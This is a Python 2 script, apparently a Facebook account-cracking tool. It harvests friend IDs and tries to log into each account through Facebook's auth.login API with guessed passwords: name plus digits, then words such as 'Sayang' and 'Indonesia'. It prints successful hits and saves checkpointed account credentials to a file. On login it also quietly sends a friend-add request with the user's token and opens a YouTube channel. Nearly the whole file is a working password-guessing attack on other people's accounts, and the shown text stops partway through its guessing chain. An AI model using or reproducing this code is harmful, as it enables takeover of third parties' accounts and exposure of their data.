#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


#### LOGO ####
logo = """
\033[1;98m   _____   __     ______     ______     ______    
\033[1;97m /\__  _\ /\ \   /\  ___\   /\  ___\   /\  == \   
\033[1;95m \/_/\ \/ \ \ \  \ \ \__ \  \ \  __\   \ \  __<   
\033[1;94m    \ \_\  \ \_\  \ \_____\  \ \_____\  \ \_\ \_\ 
\033[1;93m     \/_/   \/_/   \/_____/   \/_____/   \/_/ /_/ 
\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
\033[1;97m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  𝕸𝖗.𝕽𝖆𝖓𝖆 𝕬𝖆𝖍𝖎𝖑                     ║
\033[1;97m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ Aahil Creations                  ║
\033[1;97m    ║✯ Remodifed by RizredVlo7zer0✬               ║
\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;97m************************************************
\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR AAHIL ~
\033[1;97m************************************************

\033[1;92m____─▄───────▄█▄───────▄─ Stay Home 💓
\033[1;92m____▐█▌──▄──█████──▄──▐█▌ Stay Safe 💓
\033[1;92m____─█──███▄▄███▄▄███──█─ 
\033[1;92m____░█░░█▄█▄█▀▒▀█▄█▄█░░█░ 
\033[1;92m____██▄▄█▄█▄█▒▒▒█▄█▄█▄▄██ 
"""
            
jalan("\033[1;92mLoading . . . ") 



def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[⚡] \x1b[1;91m───Login your new ID───\x1b[1;93m[⚡]' )
		id = raw_input('\033[1;93m[+] \x1b[0;34mEnter ID/Email \x1b[1;95m: \x1b[1;95m')
		pwd = raw_input('\033[1;95m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mAisa lagta hai apka account checkpoint pe hai")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email ghalat hai")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;32;40m    ╔═════════════════════════════════╗"
        print "\033[1;32;40m    \033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;32;40m"                               
        print "\033[1;32;40m    \033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;32;40m"
        print "\033[1;32;40m    \033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"                      \033[1;32;40m"
	print "\033[1;32;40m    ╚═════════════════════════════════╝"
	print "\n    \033[1;32;40m[1] \033[1;33;40m‹•.•› Start♥Cracking"	
																														
	print "    \033[1;32;40m[0] \033[1;33;40m‹•.•› Logout"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●══════════════════◄►══════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\n     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95mCrack daftar teman"
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95mCrack Id publik/teman"
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;91m^.^ Choose an Option >>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;92m\n•◈•══════•◈•\033[1;91mBlackTiger\033[1;92m•◈•══════•◈•\n"
		jalan('\033[1;91mGetting IDs \033[1;91m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\n\033[1;92m[•◈•] \033[1;92mEnter ID\033[1;92m: \033[1;92m")
		print "\033[1;92m\n•◈•══════••◈•\033[1;91mBlackTiger\033[1;92m•◈•══════••◈•\n"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;92mNama Pengguna\033[1;92m:\033[1;92m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			super()
		print"\n\033[1;91mGetting IDs\033[1;91m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;32;40m[✺] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;32;40m[✺] Please Wait ...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Stop Press CTRL+Z \033[1;92m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94\n"
	print "\033[1;92m●══════════════════◄►══════════════════●"
	print "\n\033[1;91mList Pasword :\n"
        print "\033[1;91m~ first_name + 123"
        print "\033[1;91m~ first_name + 1234"
        print "\033[1;91m~ first_name + 12345"
        print "\033[1;91m~ first_name + 000"
        print "\033[1;91m~ last_name + 123"
        print "\033[1;91m~ last_name + 1234"
        print "\033[1;91m~ last_name + 12345"
        print "\033[1;91m~ last_name + 000"
        print "\033[1;91m~ Sayang"
        print "\033[1;91m~ Anjing"
        print "\033[1;91m~ Kontol"
        print "\033[1;91m~ Indonesia"
        print "\033[1;91m~ Cantik"
        print "\033[1;91m~ Doraemon"
        print "\033[1;91m~ Ganteng"
        print "\033[1;91m~ Cinta"
        print "\033[1;91m~ Terserah"
        print "\033[1;91m~ Goblok"
        print "\033[1;91m~ Tolol"
        print "\033[1;91m~ Jancok\n"
	print "\033[1;92m●══════════════════◄►═════════════════●\n" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '123'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b ['name']
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
                                    pass2 = b['first_name'] + '1234'
      			            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user								
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['first_name']+'12345'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'								
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']									
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user							
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['last_name'] + '123'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = b['last_name'] + '1234'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'						
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']							
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user					
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = b['last_name'] + '12345'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user									
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:
							                                       pass7 = 'Sayang'					
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'					
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']					
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = 'Anjing'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user										
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = 'Kontol'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user	
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)
                                                                                                                               else:
										                                                   pass10 = 'Indonesia'					
										                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                   q = json.load(data)				
										                                                   if 'access_token' in q:		
		                                                                                                                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                           z = json.loads(x.text)
											                                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass10 + '\n'
											                                                   oks.append(user+pass10)
                                                                                                                                   else:
			                                                                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                                                                               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass10 + '\n'
				                                                                                                               cek = open("out/super_cp.txt", "a")
				                                                                                                               cek.write("ID:" +user+ " Pw:" +pass10+"\n")
				                                                                                                               cek.close()
				                                                                                                               cekpoint.append(user+pass10)
                                                                                                                                           else:
										                                                               pass11 = 'Cantik'					
										                                                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                               q = json.load(data)				
										                                                               if 'access_token' in q:		
		                                                                                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                                       z = json.loads(x.text)
											                                                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass11 + '\n'
											                                                               oks.append(user+pass11)
                                                                                                                                               else:
			                                                                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                                                                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass11 + '\n'
				                                                                                                                           cek = open("out/super_cp.txt", "a")
				                                                                                                                           cek.write("ID:" +user+ " Pw:" +pass11+"\n")
				                                                                                                                           cek.close()
				                                                                                                                           cekpoint.append(user+pass11)
